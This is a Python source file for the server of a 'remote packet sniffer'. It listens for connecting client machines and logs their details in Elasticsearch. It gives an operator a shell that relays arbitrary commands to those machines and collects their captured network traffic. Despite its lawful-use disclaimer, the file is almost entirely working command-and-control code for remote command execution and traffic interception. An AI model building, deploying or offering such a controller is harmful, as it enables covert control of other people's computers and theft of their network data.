#Created by Vasto Boy

#Disclaimer: This remote packet sniffer should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.

import os
import re
import json
import time
import socket
import struct
import textwrap
import threading
from datetime import datetime
from esHandler import EsHandler
from getmac import get_mac_address as gma



class RemoteSnifferServer:

        def __init__(self, host, port1, port2, index_name, es_url):
            self.host = host
            self.port1 = port1
            self.port2 = port2
            self.sock1 = None
            self.sock2 = None
            self.conn1 = None
            self.conn2 = None
            self.eshandler = EsHandler(index_name, es_url)



        # create socket and listen for client connections
        def create_socket(self):
            try:
                self.sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock1.bind((self.host, self.port1))
                self.sock1.listen(5) # Listen for connections on port 1
                print(f"Listening on port {self.port1}")


                self.sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock2.bind((self.host, self.port2))
                self.sock2.listen(5) # Listen for connections on port 2
                print(f"Listening on port {self.port2}")

            except socket.error as err:
                print("[-]Error unable to create socket!!!" + str(err))



        #handles incoming connection
        def handle_client(self):
            while True:
                try:
                    self.conn1, addr = self.sock1.accept()
                    self.conn1.setblocking(True)
                    print(f"\n[+]Session 1 has started on port {self.port1}")
                    

                    self.conn2, addr = self.sock2.accept()
                    self.conn2.setblocking(True)
                    print(f"[+]Session 2 has started on port {self.port2}")
                   

                    client_data = self.conn1.recv(1024).decode() # receive response from client
                    ip = re.findall("'(.*?)'", str(addr)) # format IP from addr
                    ip = {"ip": "".join(ip)}
                    
                    client_data = json.loads(client_data)
                    client_data_dict = ip.copy() #prepend ip to the start of the dictionary
                    client_data_dict.update(client_data)
                    is_client_indexed = self.eshandler.store_client_information(client_data_dict)

                    # disconnect if client was not indexed sucessfuly
                    if not is_client_indexed:
                        self.conn1.close()
                        self.conn2.close()
                        print("[+]Connection has been closed!!!")
   
                except KeyboardInterrupt:
                    break


        # format text to bold and red 
        def change_text_color(self, text):
            RESET = "\033[0m"
            BOLD = "\033[1m"
            COLOR = "\u001b[36m" 
            return f"{BOLD}{COLOR}{text}{RESET}"



         #shell interface
        def shell_interface(self):

            while True:
                print(self.change_text_color("Sniffer: "), end="")
                cmd = input()
                cmd = cmd.rstrip()

                if cmd == '':
                    pass

                 # delete all document in the specified index
                elif cmd == 'guide':
                    self.show_commands()

                # display all clients within index
                elif cmd.strip() == 'clients':
                    self.eshandler.retrieve_client_information()

                # check if client connection is active
                elif cmd.strip() == 'connected':
                    if self.is_conn_active():
                        self.eshandler.retrieve_client_information()
                    else:
                        print("[-]No active connections!!!")

                #delete all document in the specified index
                elif cmd == 'delete all':
                    self.eshandler.delete_all_docs()

                #delete specified document
                elif 'delete' in cmd:
                    client_id = cmd[7:]
                    self.eshandler.delete_document(client_id)


                elif 'shell' in cmd:
                    # check if connection is still active
                    if self.conn1:
                        try:
                            #self.conn.send("check call".encode())
                            self.handle_client_session()
                        except Exception as e:

                            print("[-]Client connection is not active!!!")
                    else:
                        print("[-]No connection is active!!!")




        # sends null to the client and get the current working directory in return
        def send_null(self):
            self.conn1.send(str(" ").encode())
            data = self.conn1.recv(1024).decode()
            print(str(data), end="")



        # checks if connection is active
        def is_conn_active(self):
            try:
                self.conn1.send(str(" ").encode())
                data = self.conn1.recv(1024).decode()

                if data:
                    return True
            except:
                return False



        # sends commands to the client
        def handle_client_session(self):
                self.send_null()

                while True:
                    cmd = ""
                    cmd = input()
                    cmd = cmd.rstrip()

                    if cmd.strip()== 'quit':
                        print("[+]Closing Session!!!!....")
                        break

                    elif cmd == "":
                        self.send_null() 

                    elif cmd == "start sniffer":
                        sniffer_thread = threading.Thread(target=self.handle_captures)
                        sniffer_thread.start

                        self.conn1.send(str(cmd).encode())
                        data = self.conn1.recv(65536).decode()
                        print(str(data), end="")
                        sniffer_thread.start()

                    elif cmd == "stop sniffer":
                        self.conn1.send(str(cmd).encode())
                        data = self.conn1.recv(65536).decode()
                        print(str(data), end="")

                    else:
                        try:
                            self.conn1.send(str(cmd).encode())
                            data = self.conn1.recv(65536).decode()
                            print(str(data), end="")
                        except:
                            print("[-]Connection terminated!!!")
                            break


        # process and index capture from client machine
        def handle_captures(self):

            while True:
                try:
                    # Receive captures from client machine
                    capture_bytes = self.recvall()
                    if capture_bytes:

                        captures_jsons = capture_bytes.decode()
                        captures = json.loads(captures_jsons, parse_int=str)

                        for capture in captures:
                            #print(capture)
                            #print("\n")
                            self.eshandler.index_capture(capture)
                    else:
                        continue
                except Exception as e:
                    print(f"[-]Error occurred while receiving captures: {e}")
                    continue



        # handles packet by accumulating it until all expected data has been received
        def recvall(self, buffer_size=8192):
            data = bytearray()

            while True:
                data_chunk = self.conn2.recv(buffer_size)
                data += data_chunk
                if len(data_chunk) < buffer_size:
                    # Either 0 or end of data
                    break
            return data



        # displays caesar shell commands
        def show_commands(self):
            user_guide = """
                Remote Sniffer Commands
                     'guide':[Display Remote Sniffer user commands]
                     'clients':['displays clients within ES index']
                     'connected':['display all active connection within ES index']
                     'shell':['starts session between the server and the client machine']
                     'delete (ES ID)': ['remove specified document from index using ES ID']
                     'delete all': ['deletes all document from index']

                Client Commands                                                
                    'quit':['quits the session and takes user back to Remote Sniffer interface']           
                    'start sniffer' ['start remote sniffer']
                    'stop sniffer': ['stops remote sniffer']      
                """
            print(user_guide)



        def start(self):
            self.create_socket()
            self.handle_client()





art = """
██████╗ ███████╗███╗   ███╗ ██████╗ ████████╗███████╗    ███████╗███╗   ██╗██╗███████╗███████╗███████╗██████╗ 
██╔══██╗██╔════╝████╗ ████║██╔═══██╗╚══██╔══╝██╔════╝    ██╔════╝████╗  ██║██║██╔════╝██╔════╝██╔════╝██╔══██╗
██████╔╝█████╗  ██╔████╔██║██║   ██║   ██║   █████╗      ███████╗██╔██╗ ██║██║█████╗  █████╗  █████╗  ██████╔╝
██╔══██╗██╔══╝  ██║╚██╔╝██║██║   ██║   ██║   ██╔══╝      ╚════██║██║╚██╗██║██║██╔══╝  ██╔══╝  ██╔══╝  ██╔══██╗
██║  ██║███████╗██║ ╚═╝ ██║╚██████╔╝   ██║   ███████╗    ███████║██║ ╚████║██║██║     ██║     ███████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
""" 

print(art)




sniffer = RemoteSnifferServer("192.168.1.206", 5001, 5002, "sniffer", "http://localhost:9200")
sniffer.show_commands()

# Create two threads for the functions
thread1 = threading.Thread(target=sniffer.start)
thread2 = threading.Thread(target=sniffer.shell_interface)

# Start threads
thread1.start()
thread2.start() 


